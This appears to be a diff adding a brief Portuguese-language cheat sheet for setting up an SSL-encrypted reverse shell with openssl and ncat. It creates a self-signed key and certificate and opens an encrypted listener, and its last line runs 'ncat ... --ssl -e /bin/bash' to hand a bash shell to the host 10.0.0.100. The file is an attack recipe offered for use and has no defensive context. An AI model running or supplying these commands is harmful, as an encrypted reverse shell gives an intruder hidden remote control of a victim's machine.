@@ -1,0 +1,17 @@
+Pacote: openssl, netcat(nc)
+
+Criar chaves SSL
+
+openssl req -x509 -newkey rsa:2048 -keyout <CHAVE>.pem -out <CERTIFICADO>.pem -days 10
+
+______________________________________________________________________________
+
+Abrir porta com SSL
+
+ncat -lvp <PORTA> --ssl-key <CHAVE>.pem --ssl-cert <CERTIFICADO>.pem
+
+______________________________________________________________________________
+
+Reverse shell com SSL
+
+ncat -nv 10.0.0.100 8080 --ssl -e /bin/bash
